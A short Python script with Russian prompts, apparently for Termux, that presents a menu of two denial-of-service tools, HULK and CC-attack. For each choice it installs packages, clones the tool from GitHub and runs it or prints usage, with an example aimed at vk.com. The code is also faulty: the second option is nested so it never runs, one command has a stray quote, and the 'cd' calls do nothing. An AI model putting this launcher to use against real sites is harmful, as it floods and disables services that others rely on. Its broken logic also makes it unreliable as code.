# Импорт модулей
import os, time
from colorama import Fore, Back, Style

# Вывод
print(Fore.GREEN + "— [1] " + Fore.WHITE + "HULK")
print(Fore.GREEN + "— [2] " + Fore.WHITE + "CC-attack")
time.sleep(0.5)

js_num = input(Fore.GREEN + "— " + Fore.WHITE + "Введите номер функции " + Fore.GREEN + ": ")

if js_num == "1":
	
	os.system("clear")
	os.system("pkg update -y && pkg upgrade -y")
	os.system("pkg install golang -y")
	os.system("'pkg install python -y")
	os.system("pip3 install requests -y && pip3 install pysocks -y")
	
	os.system("git clone https://github.com/grafov/hulk")
	os.system("cd hulk")
	
	print("— Для запуска скрипта введите :")
	print("go run hulk.go -site |сайт|")
	print("— Например : go run hulk.go -site https://vk.com")
	
	if js_num == "2":
		
		os.system("clear")
		os.system("pkg update -y && pkg upgrade -y")
		os.system("pkg install golang  -y")
		os.system("pkg install python -y")
		os.system("pip3 install requests -y && pip3 install pysocks -y")
		
		os.system("git clone https://github.com/Leeon123/CC-attack")
		os.system("cd CC-attack")
		os.system("python cc.py")